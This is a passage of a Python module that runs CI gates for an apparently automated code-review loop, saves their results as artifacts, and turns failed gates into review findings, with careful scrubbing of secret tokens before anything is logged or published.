            stdout_excerpt=_truncate(_scrub(captured_stdout)),
            stderr_excerpt=_truncate(_scrub(captured_stderr)),
            duration_seconds=duration,
            started_at_iso=started,
            error=f"timed out after {timeout:g}s",
        )
    except (FileNotFoundError, PermissionError, OSError) as exc:
        duration = time.monotonic() - started_monotonic
        # Iter-23 Finding 2: ``FileNotFoundError``'s default repr
        # embeds the full argv tuple, so when a gate cmd carries an
        # operator-supplied token in argv the token lands here. Scrub
        # at the source — once ``GateResult.error`` is set every
        # downstream consumer (to_dict for state.gate_runs, evidence
        # builder for synthetic findings, artifact renderer) sees the
        # redacted form by default.
        return GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=duration,
            started_at_iso=started,
            error=_scrub(f"{type(exc).__name__}: {exc}"),
        )
    except Exception as exc:  # noqa: BLE001 - defensive: never raise
        duration = time.monotonic() - started_monotonic
        return GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=duration,
            started_at_iso=started,
            error=_scrub(f"{type(exc).__name__}: {exc}"),
        )
    duration = time.monotonic() - started_monotonic
    return GateResult(
        gate=gate,
        exit_code=proc.returncode,
        # Scrub-then-truncate (iter-22 Finding 1): see the
        # corresponding comment in the timeout branch above.
        stdout_excerpt=_truncate(_scrub(proc.stdout or "")),
        stderr_excerpt=_truncate(_scrub(proc.stderr or "")),
        duration_seconds=duration,
        started_at_iso=started,
        error="",
    )


def run_gates(
    worktree: Path,
    gates: Sequence[Gate],
    *,
    artifacts_dir: Path,
    round_number: int,
    mode: str,
    default_timeout: float = DEFAULT_GATE_TIMEOUT_SECONDS,
) -> List[GateResult]:
    """Execute every gate in ``gates`` and persist artifacts.

    Returns the list of ``GateResult`` rows in the same order as
    ``gates``. Persists:
    * ``round-{R}-{mode}-gates.json`` — the entire result list as JSON.
    * ``round-{R}-{mode}-gate-{slug}.txt`` — one human-readable per-gate
      artifact for offline inspection.

    Never raises. A runner-side subprocess failure is recorded with
    ``exit_code=None`` and a non-empty ``error``; the caller is expected
    to treat that as a gate failure via ``gate_results_to_findings``.
    """
    try:
        artifacts_dir.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        logger.warning(
            "checkup-gates: artifacts dir %s unwritable (%s); "
            "running gates without persistence.",
            artifacts_dir,
            exc,
        )
    results: List[GateResult] = []
    for gate in gates:
        # Execute the gate first; ``_execute_one`` is already
        # exception-safe and returns a ``GateResult`` even on
        # runner-side failure. Persistence is best-effort: if writing
        # the per-gate artifact raises (disk full, read-only fs), we
        # OVERWRITE this gate's result with a runner-error entry so
        # the audit trail records the persistence failure on that
        # specific gate AND the loop sees a failing finding rather
        # than mistaking the gate for "passed". The other gates
        # continue executing.
        result = _execute_one(worktree, gate, default_timeout=default_timeout)
        # Iter-25 Finding 1: scrub the gate name BEFORE slugging so a
        # token-bearing name (e.g. ``py-compile:ghp_xxx.py``) cannot
        # land verbatim in the per-gate artifact filename — that
        # filename is part of the public audit surface.
        per_gate_path = (
            artifacts_dir
            / f"round-{round_number}-{mode}-gate-{_safe_slug(_scrub(gate.name))}.txt"
        )
        try:
            per_gate_path.write_text(_render_per_gate_body(result), encoding="utf-8")
        except Exception as exc:  # noqa: BLE001 - defensive: never raise
            # Iter-24 Finding 2: scrub BEFORE the warning log. The
            # raw exception text (and its traceback under
            # ``exc_info=True``) can carry a path containing a token
            # or any string a poisoned gate cmd shoved into the
            # filename — CI/cloud log capture would otherwise
            # harvest it. Demote the traceback to debug so the
            # warning line stays clean.
            persistence_error = _scrub(f"{type(exc).__name__}: {exc}")
            # Iter-25 Finding 3: ``gate.name`` itself can carry a
            # token-bearing path (per-file gates name themselves as
            # ``py-compile:<rel>``); scrub before interpolating into
            # the WARNING log surface. Drop the ``exc_info=True``
            # debug follow-up entirely: ``traceback.format_exception``
            # re-renders the raw exception message — defeating the
            # WARNING-line scrub — and any operator who needs the
            # full traceback can reproduce the failure locally
            # without scrubbing.
            logger.warning(
                "checkup-gates: failed to persist artifact for gate %r: %s",
                _scrub(gate.name),
                persistence_error,
            )
            # If the gate itself passed, downgrade to a runner-error
            # row so the loop's findings adapter still surfaces the
            # broken persistence. If the gate already failed, keep
            # its original exit code and append the persistence error
            # to ``error`` so the existing failure ride-along stays
            # intact while the operator still sees the artifact gap.
            if result.exit_code == 0:
                result = GateResult(
                    gate=result.gate,
                    exit_code=None,
                    stdout_excerpt=result.stdout_excerpt,
                    stderr_excerpt=result.stderr_excerpt,
                    duration_seconds=result.duration_seconds,
                    started_at_iso=result.started_at_iso,
                    error=persistence_error,
                )
            else:
                combined_error = (
                    f"{result.error}; persistence: {persistence_error}"
                    if result.error
                    else persistence_error
                )
                result = GateResult(
                    gate=result.gate,
                    exit_code=result.exit_code,
                    stdout_excerpt=result.stdout_excerpt,
                    stderr_excerpt=result.stderr_excerpt,
                    duration_seconds=result.duration_seconds,
                    started_at_iso=result.started_at_iso,
                    error=combined_error,
                )
        results.append(result)
    manifest = artifacts_dir / f"round-{round_number}-{mode}-gates.json"
    try:
        manifest.write_text(
            json.dumps([result.to_dict() for result in results], indent=2),
            encoding="utf-8",
        )
    except Exception as exc:  # noqa: BLE001 - defensive: never raise
        # The aggregate manifest is best-effort. Per-gate text artifacts
        # (and the in-memory results returned to the caller) are the
        # ship-gate; losing the JSON manifest only hurts later offline
        # audit, so log and continue rather than failing the loop.
        #
        # Iter-24 Finding 2: scrub the exception text before logging,
        # for the same reason as the per-gate persistence path. The
        # manifest path is short but a malicious gate could prepend
        # any string the operator allowed into ``artifacts_dir``.
        scrubbed_exc = _scrub(f"{type(exc).__name__}: {exc}")
        # Iter-25 Finding 3: drop the ``exc_info=True`` follow-up;
        # ``traceback.format_exception`` re-renders the raw
        # exception message at DEBUG, defeating the scrub above.
        logger.warning(
            "checkup-gates: failed to persist manifest %s: %s",
            manifest,
            scrubbed_exc,
        )
    return results


def _render_per_gate_body(result: GateResult) -> str:
    # Iter-23 Finding 2: the cmd argv and runner ``error`` can carry
    # operator-supplied secrets (a fork PR could ship a poisoned
    # ``package.json`` script with a literal token embedded). The
    # per-gate artifact is the long-term audit record; scrub before
    # persistence so a future operator review of the artifacts cannot
    # accidentally surface a token. Output excerpts are already
    # scrubbed upstream by ``_execute_one``.
    # Iter-25 Finding 1: gate.name and gate.source can carry a
    # token-like path (a Python file under a directory whose name
    # happens to match the scrub regex). Scrub here so the per-gate
    # artifact body is safe.
    lines: List[str] = []
    lines.append(f"gate: {_scrub(result.gate.name)}")
    lines.append(f"cmd: {_scrub(' '.join(result.gate.cmd))}")
    lines.append(f"source: {_scrub(result.gate.source)}")
    lines.append(f"started: {result.started_at_iso}")
    lines.append(f"duration_seconds: {result.duration_seconds:.3f}")
    if result.exit_code is None:
        lines.append("exit_code: <runner-error>")
        lines.append(f"error: {_scrub(result.error or '')}")
    else:
        lines.append(f"exit_code: {result.exit_code}")
    lines.append("")
    lines.append("---- stdout ----")
    lines.append(result.stdout_excerpt or "")
    lines.append("---- stderr ----")
    lines.append(result.stderr_excerpt or "")
    return "\n".join(lines) + "\n"


# ---------------------------------------------------------------------------
# Findings adapter
# ---------------------------------------------------------------------------


def _build_evidence(result: GateResult) -> str:
    """Render the short evidence string for the synthetic finding.

    ``result.error`` (the volatile runner-side detail — exception class,
    ``[Errno N]`` codes, round-specific artifact paths) lives here only.
    It must NOT leak into ``_build_finding_message`` because the
    ``ReviewFinding.key`` dedup contract (codex review iteration 2,
    Finding 1) requires the message stay constant across rounds for the
    same gate-name; otherwise identical persistence failures across
    rounds produce different keys and the loop spams duplicate findings.
    """
    # Iter-23 Finding 2: ``result.error`` is the raw ``str(exc)`` of
    # the subprocess failure (``FileNotFoundError``, ``TimeoutExpired``,
    # generic ``Exception``). Python's exception representation for
    # FileNotFoundError includes the full argv tuple — so when an
    # operator-supplied gate cmd contains a token (intentional or
    # not), that token lands verbatim in ``result.error`` and then
    # in ``ReviewFinding.evidence``, which is rendered into the
    # public GitHub PR comment AND persisted to ``final-state.json``.
    # Scrub before interpolating. The cmd line itself can carry the
    # same payload, so scrub it too.
    if result.exit_code is None:
        prefix = "Runner error"
        if result.error:
            prefix += f": {_scrub(result.error)}"
    else:
        prefix = f"Gate exit_code={result.exit_code}"
    cmd_line = _scrub(" ".join(result.gate.cmd))
    tail = result.stderr_excerpt or result.stdout_excerpt
    if tail:
        tail = tail.strip()
        if len(tail) > 2000:
            tail = tail[:2000] + "\n[...]"
    # Iter-25 Finding 1: scrub gate.source too. A PR can change a
    # file like ``ghp_…/foo.py`` and the per-file gate's ``source``
    # would otherwise carry that path verbatim into the public PR
    # comment via ReviewFinding.evidence.
    body = f"{prefix} for `{cmd_line}` ({_scrub(result.gate.source)})."
    if tail:
        body += f"\nOutput tail:\n{tail}"
    return body


def _build_required_fix(result: GateResult) -> str:
    # Iter-23 Finding 2: same scrub contract as ``_build_evidence`` —
    # ``required_fix`` is rendered into the public PR comment and
    # the JSON state artifact, so a token embedded in the cmd argv
    # must not leak.
    cmd_line = _scrub(" ".join(result.gate.cmd))
    base = f"Run `{cmd_line}` locally and address the failure"
    if result.gate.required_fix_hint:
        # Iter-25 Finding 1: the hint contains the changed-file
        # ``{rel}`` path for per-file gates (py-compile/ruff/black/
        # mypy), so a PR file whose name contains a token-shaped
        # substring would otherwise land in ``required_fix`` →
        # public PR comment.
        return f"{base}. {_scrub(result.gate.required_fix_hint)}"
    return base + "."


def _build_finding_message(result: GateResult) -> str:
    """Build the ``finding`` field for the synthetic ReviewFinding.

    ``ReviewFinding.key`` is built from
    ``severity|location|finding|required_fix``. To keep the dedup key
    stable across rounds for the same gate, this string MUST be
    deterministic and MUST NOT embed any per-invocation detail such as
    ``result.error`` (which carries exception class names, ``[Errno N]``
    codes, or round-specific artifact paths). The volatile detail lives
    in ``_build_evidence`` (codex review iteration 2, Finding 1).
    """
    # Iter-25 Finding 1: scrub the gate name interpolated into the
    # finding message. The message lands in ReviewFinding.finding,
    # which is published into the public PR comment and persisted
    # to final-state.json["findings"], and the dedup-key contract
    # (codex iter-2 Finding 1) means a stable scrubbed form is
    # still per-gate-unique.
    scrubbed_name = _scrub(result.gate.name)
    if result.exit_code is None:
        return (
            f"Deterministic gate {scrubbed_name!r} failed to execute "
            "(runner error)."
        )
    return (
        f"Deterministic gate {scrubbed_name!r} failed with exit "
        f"code {result.exit_code}."
    )


def gate_results_to_findings(
    results: Sequence[GateResult],
    *,
    round_number: int,
) -> List["object"]:
    """Convert failed ``GateResult`` rows into ``ReviewFinding`` objects.

    Passed gates are skipped. Failed gates (``exit_code != 0`` OR
    ``exit_code is None``) emit one ``ReviewFinding`` each, with
    ``reviewer = f"gate:{gate.name}"`` so the loop's audit trail can
    distinguish synthetic findings from LLM-reviewer findings.
    """
    # Imported here to avoid the circular dependency at module load.
    from .checkup_review_loop import ReviewFinding

    findings: List[ReviewFinding] = []
    for result in results:
        if result.passed:
            continue
        findings.append(
            ReviewFinding(
                severity=result.gate.severity,
                # Iter-25 Finding 1: scrub the gate name and source
                # interpolated into reviewer/location. Both fields
                # are public rendering surfaces (PR comment +
                # final-state.json).
                reviewer=f"gate:{_scrub(result.gate.name)}",
                area=result.gate.area,
                evidence=_build_evidence(result),
                finding=_build_finding_message(result),
                required_fix=_build_required_fix(result),
                location=_scrub(result.gate.source),
                status="open",
                round_number=round_number,
            )
        )
    return findings


__all__ = [
    "DEFAULT_GATE_TIMEOUT_SECONDS",
    "Gate",
    "GateResult",
    "discover_gates",
    "gate_results_to_findings",
    "run_gates",
]
